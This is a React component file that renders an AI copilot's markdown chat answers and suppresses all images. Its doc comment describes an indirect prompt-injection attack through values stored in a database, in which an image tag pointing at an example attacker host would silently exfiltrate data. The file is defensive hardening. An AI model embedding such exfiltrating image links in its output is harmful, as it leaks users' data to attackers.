import React, { useCallback, useEffect } from 'react'
import { CloudLink } from 'uiSrc/components/markdown'
import { MarkdownRenderer } from 'uiSrc/components/markdown/MarkdownRenderer'
import { AdditionalRedisModule } from 'apiClient'
import { ChatExternalLink, CodeBlock } from './components'

// Matches the leaf shape MarkdownRenderer passes for its `RedisCode`/
// `CodeBlock` nodes; `label`/`params`/`path` are part of that shape too but
// unused here, since Copilot chat only needs the code text and its language.
export interface CodeProps {
  children: string
  lang?: string
}

export interface Props {
  onRunCommand?: (query: string) => void
  modules?: AdditionalRedisModule[]
  children: string
  onMessageRendered?: () => void
}

// Renders nothing for both markdown image syntax (`![]()`) and any raw
// `<img>` MarkdownRenderer's default `img` handler would otherwise emit.
const NoImage = () => null

/**
 * Copilot answers are plain markdown (text, tables, code, links). They never
 * contain images or embedded media, and message content can be influenced by
 * untrusted data (e.g. indirect prompt injection via values stored in the
 * database), so images must never render: an `<img src="https://attacker/?...">`
 * (from raw HTML or from markdown image syntax) would otherwise fire an
 * outbound request as soon as the browser loads it, silently exfiltrating
 * data. Raw HTML is already inert because MarkdownRenderer never parses it
 * into live elements (no rehype-raw); the `Image` leaf below closes the
 * remaining gap for markdown-syntax images, which MarkdownRenderer renders as
 * a live `<img>` by default when no `Image` leaf is supplied. See
 * RED-194228 / VDP-4596.
 */
const MarkdownMessage = (props: Props) => {
  const { modules, children, onMessageRendered, onRunCommand } = props

  const ChatCodeBlock = useCallback(
    ({ lang, children: code }: CodeProps) => (
      <CodeBlock lang={lang} modules={modules} onRunCommand={onRunCommand}>
        {code}
      </CodeBlock>
    ),
    [modules, onRunCommand],
  )

  useEffect(() => {
    onMessageRendered?.()
  }, [children])

  return (
    <MarkdownRenderer
      allLangs
      components={{
        RedisCode: ChatCodeBlock,
        CodeBlock: ChatCodeBlock,
        CloudLink,
        ExternalLink: ChatExternalLink,
        Image: NoImage,
      }}
    >
      {children}
    </MarkdownRenderer>
  )
}

export default React.memo(MarkdownMessage)
